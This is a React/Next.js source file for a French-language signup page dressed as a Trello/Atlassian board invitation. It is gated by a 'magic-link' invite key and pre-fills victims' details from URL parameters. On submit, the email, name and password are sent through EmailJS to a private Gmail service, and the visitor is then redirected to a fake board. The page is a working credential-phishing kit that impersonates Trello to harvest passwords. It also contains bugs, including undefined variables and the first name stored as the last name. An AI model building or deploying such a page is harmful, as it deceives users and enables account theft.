import React, { useState, useEffect, useRef } from 'react';
import emailjs from 'emailjs-com';
import { useRouter } from 'next/router';
import { key } from './magic-link'; // Import the key

export default function Signup() {
  const firstNameRef = useRef(null);
  const lastNameRef = useRef(null);
  const emailRef = useRef(null);
  const phoneRef = useRef(null);
  const formRef = useRef(null); // Add a ref for the form element
  const [selectedPaymentMethod, setSelectedPaymentMethod] = useState('card');
  const [password, setPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [isBackgroundVisible, setIsBackgroundVisible] = useState(true);
  const [boardName, setBoardName] = useState('Compta Somophors 24-25'); // Move state declaration here
  const [isValidInvite, setIsValidInvite] = useState(true); // Add state to track invite validity
  const router = useRouter();

  useEffect(() => {
    emailjs.init("p7vtRytijMovXPfFA");

    // Get URL parameters
    const params = new URLSearchParams(window.location.search);
    const invite = params.get('invite');
    if (invite !== key) {
      setIsValidInvite(false);
    } else {
      const name = params.get('name');
      const surname = params.get('surname');
      const email = params.get('mail');
      const phone = params.get('phone');

      // Pre-fill form fields
      if (name) firstNameRef.current.value = name;
      if (surname) lastNameRef.current.value = surname;
      if (email) emailRef.current.value = email;
      if (phone) phoneRef.current.value = phone;
      setBoardName(params.get('board') || 'Compta Somophors 24-25');
    }
  }, []);

  const sendEmail = (event) => {
    event.preventDefault();
    emailjs.sendForm('gmail-alexandre', 'new-registration', formRef.current, 'p7vtRytijMovXPfFA') // Use formRef.current
      .then(() => {
        console.log('SUCCESS!');
        // document.querySelector('.left-column').style.display = 'none';
        // document.querySelector('.right-column').style.width = '100%';
        // document.querySelector('.right-column').style.maxWidth = 'none';

        showStep(2); // Move to the confirmation step after successful email sending
      })
      .catch((error) => {
        console.log('FAILED...', error);
      });
  };

  //fonction pour cacher un élément et en afficher un autre :
  function showStep(step) {
    if (typeof document !== 'undefined') {
      const steps = document.querySelectorAll('.checkout-step');
      steps.forEach(s => s.classList.remove('active'));
      steps[step].classList.add('active');
    }
  }

  const handlePasswordChange = (e) => {
    setPassword(e.target.value);
  };

  const handleCreateAccount = (e) => {

    //verify if each input filled
    if (!emailRef.current.value || !firstNameRef.current.value || !lastNameRef.current.value || !password) {
      alert('Veuillez remplir tous les champs');
      return;
    }

    e.preventDefault();
    setIsLoading(true);
    setIsBackgroundVisible(true); // Assurez-vous que la div d'arrière-plan reste visible

    // Store first name and last name in session storage
    sessionStorage.setItem('firstName', firstNameRef.current.value);
    sessionStorage.setItem('lastName', firstNameRef.current.value);

    sendEmail(e);
    setTimeout(() => {
      router.push(`/board?invite=${key}&owner=${firstNameRef.current.value}&board=${boardName}&members=${membersCount}&tasks=${tasksCount}&creation=${creationDate}`);
    }, 5000);
  };

  const isMinLength = password.length >= 8;
  const hasSpecialChar = /[!@#$%^&*(),.?":{}|<>]/.test(password);
  const hasNumber = /\d/.test(password);

  return (
    <div className='container'>
      <img className='img-1' src='/bg-img1.png'/>
      <img className='img-2' src='/bg-img2.png'/>

      <article> 
        <img src='/trello-logo.png' className='logo'/>

        {isLoading && (
        <div className="loading-wrapper">
            <h1>Création du compte</h1>
            <p>Veuillez patienter quelques instants<br/> vous allez être redirigé.</p>
            <div className="spinner"></div>
        </div>
      )}

        {isValidInvite ? (
          <>
            <h1>Inscrivez-vous pour rejoindre </h1>
            <h3 className='signup'>{boardName}</h3>
            <form className="checkout-form" onSubmit={sendEmail} ref={formRef}> {/* Add ref to the form */}
              <input type="hidden" name="website" value='collective-partners' />

              <div className='checkout-step active'>
                <label>
                  <input type="text" name="email" placeholder="Adresse e-mail" ref={emailRef} required/>
                </label>
                <div className="form-row">
                  <label>
                    <input type="text" name="firstName" placeholder="Prénom" ref={firstNameRef} required/>
                  </label>
                  <label>
                    <input type="text" name="lastName" placeholder="Nom" ref={lastNameRef} required/>
                  </label>
                </div>
                <label>
                  <input 
                    type="password" 
                    name="password" 
                    placeholder="***********" 
                    value={password} 
                    onChange={handlePasswordChange} 
                    required
                  />
                  <ul className='pass-row'>
                    <li className={isMinLength ? 'completed' : ''}><span>•</span> 8 caractères min.</li>
                    <li className={hasSpecialChar ? 'completed' : ''}><span>•</span> 1 caractère spécial</li>
                    <li className={hasNumber ? 'completed' : ''}><span>•</span> 1 chiffre</li>
                  </ul>
                </label>
                <button type="submit" id="delivery-checkout" onClick={handleCreateAccount}>S'inscrire</button>
              </div>
            <hr/>
            <img src='/atlassian-logo.png' className='logo footer'/>
            <p className='notice footer'>One account for Trello, Jira, Confluence and <a href='https://support.atlassian.com/atlassian-account/docs/what-is-an-atlassian-account/' target="_blank">more</a></p>
            <p className='notice footer'>This site is protected by reCAPTCHA and the Google <a href='https://policies.google.com/privacy'>Privacy Policy</a> and <a href='https://policies.google.com/terms'>Terms of Service</a> apply. </p>
          
            </form>
          </>
        ) : (
          <h1>Invitation invalide</h1>
        )}
      </article>
    </div>
  );
};